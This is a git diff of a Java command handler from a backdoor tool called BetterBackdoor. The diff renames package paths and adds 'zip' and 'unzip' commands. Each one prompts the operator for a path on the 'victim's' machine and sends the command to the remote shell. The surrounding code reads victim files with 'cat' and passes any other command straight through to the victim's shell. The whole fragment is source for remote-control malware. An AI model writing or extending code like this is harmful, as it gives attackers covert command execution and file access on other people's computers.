@@ -1,9 +1,9 @@
-package com.github.thatcherdev.betterbackdoor.shell;
+package com.thatcherdev.betterbackdoor.shell;
 
 import java.io.File;
 import java.io.IOException;
-import com.github.thatcherdev.betterbackdoor.BetterBackdoor;
-import com.github.thatcherdev.betterbackdoor.backend.FTP;
+import com.thatcherdev.betterbackdoor.BetterBackdoor;
+import com.thatcherdev.betterbackdoor.backend.FTP;
 
 public class HandleCommand {
 
@@ -77,9 +77,19 @@ public class HandleCommand {
 			System.out.println("Enter victim's filepath of file to get contents of:");
 			Shell.out.println("cat " + BetterBackdoor.getInput(""));
 			System.out.println(getResp());
+		} else if (command.equals("zip")) {
+			System.out.println("Enter victim's filepath of directory to compress:");
+			Shell.out.println("zip " + BetterBackdoor.getInput(""));
+			System.out.println(getResp());
+		} else if (command.equals("unzip")) {
+			System.out.println("Enter victim's filepath of ZIP file to decompress:");
+			Shell.out.println("unzip " + BetterBackdoor.getInput(""));
+			System.out.println(getResp());
 		} else if (command.equals("exit"))
 			System.exit(0);
-		else {
+		else
+
+		{
 			Shell.out.println(command);
 			System.out.println(getResp());
 		}
